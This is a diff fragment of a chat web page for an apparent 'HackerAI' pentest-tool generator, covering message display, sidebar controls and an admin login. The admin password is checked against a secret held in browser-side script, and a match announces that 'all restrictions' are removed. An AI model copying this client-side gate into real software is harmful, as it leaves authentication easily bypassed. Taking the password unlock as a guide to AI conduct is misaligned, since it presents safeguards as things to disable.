+            container.appendChild(messageDiv);
+            container.scrollTop = container.scrollHeight;
+        }
+        
+        function showTyping() {
+            const container = document.getElementById('messagesContainer');
+            typingIndicator = document.createElement('div');
+            typingIndicator.className = 'message ai';
+            typingIndicator.innerHTML = `
+                <div class="message-content">
+                    <div class="typing-indicator">
+                        HackerAI is generating pentest tools
+                        <div class="typing-dots">
+                            <div class="typing-dot"></div>
+                            <div class="typing-dot"></div>
+                            <div class="typing-dot"></div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            container.appendChild(typingIndicator);
+            container.scrollTop = container.scrollHeight;
+        }
+        
+        function hideTyping() {
+            if (typingIndicator) {
+                typingIndicator.remove();
+                typingIndicator = null;
+            }
+        }
+        
+        function verifyAdmin() {
+            const pass = document.getElementById('adminPass').value;
+            if (pass === ADMIN_SECRET) {
+                isAdminMode = true;
+                document.getElementById('vipStatus').style.display = 'flex';
+                document.getElementById('modeIndicator').textContent = '🔓 Admin Mode Active';
+                document.querySelectorAll('.admin-locked').forEach(el => el.classList.remove('admin-locked'));
+                closeAdmin();
+                addMessage('🔓 ADMIN MODE ACTIVATED - All restrictions removed', 'ai');
+            } else {
+                document.getElementById('adminPass').style.borderColor = '#ff4d4d';
+                setTimeout(() => {
+                    document.getElementById('adminPass').style.borderColor = 'rgba(255,215,0,0.4)';
+                }, 1000);
+            }
+        }
+        
+        function requestAdmin() {
+            document.getElementById('adminPanel').style.display = 'block';
+            document.getElementById('adminPass').focus();
+        }
+        
+        function closeAdmin() {
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('adminPass').value = '';
+        }
+        
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebarOverlay');
+            sidebar.classList.toggle('open');
+            overlay.style.display = sidebar.classList.contains('open') ? 'block' : 'none';
+        }
+        
+        function closeSidebar() {
+            document.getElementById('sidebar').classList.remove('open');
+            document.getElementById('sidebarOverlay').style.display = 'none';
+        }
+        
+        function quickPrompt(prompt) {
+            document.getElementById('messageInput').value = prompt;
+            document.getElementById('messageInput').focus();
+            closeSidebar();
+        }
+        
+        // Global shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeAdmin();
+                closeSidebar();
+            }
         });
     </script>
 </body>
